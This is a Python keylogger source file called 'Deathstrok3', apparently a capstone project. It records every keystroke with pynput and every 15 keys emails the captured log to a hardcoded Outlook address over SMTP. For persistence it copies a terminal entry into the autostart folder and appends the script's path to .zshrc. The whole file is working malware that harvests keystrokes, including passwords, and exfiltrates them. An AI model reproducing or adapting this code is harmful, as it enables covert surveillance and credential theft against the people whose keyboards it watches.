#!/usr/bin/env python
import shutil
import subprocess
import sys

subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])

import getpass
import smtplib
import ssl
import time

from pynput.keyboard import Key, Listener


print('''8888888b.                    888    888               888                    888       .d8888b.  
888  "Y88b                   888    888               888                    888      d88P  Y88b 
888    888                   888    888               888                    888           .d88P 
888    888  .d88b.   8888b.  888888 88888b.  .d8888b  888888 888d888 .d88b.  888  888     8888"  
888    888 d8P  Y8b     "88b 888    888 "88b 88K      888    888P"  d88""88b 888 .88P      "Y8b. 
888    888 88888888 .d888888 888    888  888 "Y8888b. 888    888    888  888 888888K  888    888 
888  .d88P Y8b.     888  888 Y88b.  888  888      X88 Y88b.  888    Y88..88P 888 "88b Y88b  d88P 
8888888P"   "Y8888  "Y888888  "Y888 888  888  88888P'  "Y888 888     "Y88P"  888  888  "Y8888P" ''')

count = 0
subject = "keylogger"
full_log = '\n'
message = 'Subject:' + subject + full_log
sender_email = 'neededaname1@outlook.com'
receiver_email = 'neededaname1@outlook.com'
email = input('Enter email:')
password = getpass.getpass(prompt='Welcome Slade:', stream=None)
port = 587
context = ssl.create_default_context()
smtp_server = "smtp.office365.com"

#Time Interval
def timed_log():
    if len(full_log) >= 15:
        send_email()
        time.sleep(10)

#Email
def send_email():
    global full_log
    global message 
    if len(full_log) >= 10:
        try: 
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_email, password)
            print(' Successful login! ')
            server.sendmail(sender_email, receiver_email,full_log)
            print(' Email sent. ')
            server.quit()
        except Exception as e:
            print(e)
#Without this Error will coccur if we try to call a boolean Value as a function
my_bool = False

# print the key strokes to the log file
#when key is pressed
def on_press(key):
  global keys, count, full_log
  full_log += str(key)
  count += 1

#Every 20 keys typed by user txt file is updated
#Can be any number
  if count >= 15:
    count = 0
    #Resets keys
    print('Deathstrok3 activated!')
    timed_log()
    
    if count == 0:
        full_log = '\n'



#When  key is released
#Breaks loop if we hit the escape key
def on_release(key):
  if key==Key.esc:
    return my_bool
      
def persistence():
    # Copy qterminal.desktop to autostart folder
    terminal_path = "/usr/share/applications/qterminal.desktop"
    autostart_path = "/home/kali/.config/autostart"
    shutil.copy(terminal_path, autostart_path)

    file_location = "/home/kali/.zshrc"
    command = "/home/kali/Documents/Capstone/Deathstrok3/Keylogger.py"
    
    # Open .zshrc file and check for entry for script
    with open(file_location) as file:
        file = file.readlines()
        # Strip newline character from last line of file and check if it matches command
        entry = file[-1].strip()
        if entry != command:
            append_command()
            print("Line created.")
        else:
            print("Line already exists.")

def append_command():
    # Add entry into .zshrc file
    file_location = "/home/kali/.zshrc"
    command = "/home/kali/Documents/Capstone/Deathstrok3/Keylogger.py"

    with open(file_location, "a") as file:
        file.write(command)

persistence()
    
#Will continously loop through until broken
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 
